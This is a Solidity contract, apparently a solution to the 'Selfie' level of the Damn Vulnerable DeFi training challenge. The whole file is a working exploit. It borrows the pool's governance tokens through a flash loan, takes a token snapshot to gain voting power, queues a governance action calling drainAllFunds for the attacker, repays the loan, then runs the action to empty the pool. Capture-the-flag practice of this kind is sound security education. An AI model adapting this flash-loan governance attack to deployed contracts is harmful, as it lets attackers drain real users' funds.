// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    address attacker;
    uint256 actionId;

    constructor(
        address poolAddress,
        address governanceAddress,
        address attackerAddress
    ) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        attacker = attackerAddress;
    }

    function attack(uint256 poolBalance) external {
        pool.flashLoan(poolBalance);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount)
        external
    {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(
            tokenAddress
        );
        token.snapshot();
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        token.transfer(address(pool), borrowAmount);
    }

    function drain() external {
        governance.executeAction(actionId);
    }
}
